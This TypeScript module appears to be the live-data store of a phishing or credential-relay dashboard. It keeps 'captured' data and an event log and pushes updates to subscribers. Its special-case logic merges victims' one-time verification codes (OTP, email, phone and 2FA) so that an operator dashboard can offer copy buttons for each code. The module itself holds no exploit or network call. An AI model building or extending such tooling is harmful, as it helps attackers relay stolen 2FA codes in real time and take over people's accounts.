import type { DataType, LiveData } from '../../lib/capturedData';

export type LiveEvent = {
  id: number;
  ts: number;
  type: string;
  data?: any;
};

type Snapshot = { data: LiveData; events: LiveEvent[]; version: number; updatedAt: number };
type Subscriber = (snapshot: Snapshot) => void;

let latestLiveData: LiveData = {};
let events: LiveEvent[] = [];
let nextEventId = 1;
let version = 0;
let updatedAt = Date.now();

const subscribers = new Set<Subscriber>();

export function getSnapshot() {
  return { data: latestLiveData, events, version, updatedAt };
}

export function setField(dataType: DataType, value: string) {
  // Special-case: verification codes are sent as JSON objects (otp/email/phone/2fa).
  // Merge them so the dashboard can show separate copy buttons for each code type.
  if (dataType === 'user_verification_codes') {
    const next = String(value ?? '');
    if (!next) {
      latestLiveData = { ...latestLiveData, [dataType]: '' };
    } else {
      try {
        const incoming = JSON.parse(next);
        const prevRaw = String(latestLiveData.user_verification_codes ?? '');
        const prev = prevRaw ? JSON.parse(prevRaw) : {};
        if (incoming && typeof incoming === 'object' && !Array.isArray(incoming)) {
          const merged = { ...(prev && typeof prev === 'object' ? prev : {}), ...incoming };
          latestLiveData = { ...latestLiveData, [dataType]: JSON.stringify(merged) };
        } else {
          latestLiveData = { ...latestLiveData, [dataType]: next };
        }
      } catch {
        // If not JSON, store raw
        latestLiveData = { ...latestLiveData, [dataType]: next };
      }
    }
  } else {
    latestLiveData = {
      ...latestLiveData,
      [dataType]: value ?? '',
    };
  }
  version += 1;
  updatedAt = Date.now();
  const snap = getSnapshot();
  for (const sub of subscribers) sub(snap);
}

export function appendEvent(type: string, data?: any) {
  const evt: LiveEvent = { id: nextEventId++, ts: Date.now(), type, data };
  events = [...events, evt].slice(-200);
  version += 1;
  updatedAt = Date.now();
  const snap = getSnapshot();
  for (const sub of subscribers) sub(snap);
}

export function clearAll() {
  latestLiveData = {};
  events = [];
  version += 1;
  updatedAt = Date.now();
  const snap = getSnapshot();
  for (const sub of subscribers) sub(snap);
}

export function subscribe(fn: Subscriber) {
  subscribers.add(fn);
  return () => subscribers.delete(fn);
}


